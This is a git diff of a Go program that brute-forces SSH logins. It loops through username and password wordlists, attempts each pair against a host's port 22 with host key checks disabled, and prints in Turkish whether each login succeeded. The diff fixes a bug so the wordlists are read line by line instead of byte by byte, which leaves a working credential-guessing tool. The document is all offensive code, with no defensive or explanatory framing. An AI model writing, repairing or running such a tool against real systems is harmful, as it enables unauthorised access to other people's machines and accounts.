@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"flag"
 	"fmt"
 	"os"
@@ -43,27 +44,40 @@ func main() {
 
 		ip := *host + ":22"
 
-		pFile, _ := os.ReadFile(*passFile)
-		uFile, _ := os.ReadFile(*userFile)
+		pFile, _ := os.OpenFile(*passFile, os.O_RDONLY, os.ModePerm)
+		uFile, _ := os.OpenFile(*userFile, os.O_RDONLY, os.ModePerm)
 
-		for _, username := range uFile {
-			for _, password := range pFile {
+		pf := bufio.NewScanner(pFile)
+		uf := bufio.NewScanner(uFile)
+
+		var usernames []string
+		for uf.Scan() {
+			usernames = append(usernames, uf.Text())
+		}
+
+		var paswords []string
+		for pf.Scan() {
+			paswords = append(paswords, pf.Text())
+		}
+
+		for _, username := range usernames {
+			for _, password := range paswords {
 				config := &ssh.ClientConfig{
-					User: string(username),
+					User: username,
 					Auth: []ssh.AuthMethod{
-						ssh.Password(string(password)),
+						ssh.Password(password),
 					},
 					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 				}
 
 				client, err := ssh.Dial("tcp", ip, config)
 				if err != nil {
-					fmt.Println(string(username), " ve ", string(password), " bilgileri ile SSH bağlantısı sağlanamadı")
+					fmt.Println(username, " ve ", password, " bilgileri ile SSH bağlantısı sağlanamadı")
 					continue
 				}
 				defer client.Close()
 
-				fmt.Println(string(username), " ve ", string(password), " bilgileri ile SSH bağlantısı sağlandı")
+				fmt.Println(username, " ve ", password, " bilgileri ile SSH bağlantısı sağlandı")
 			}
 		}
 
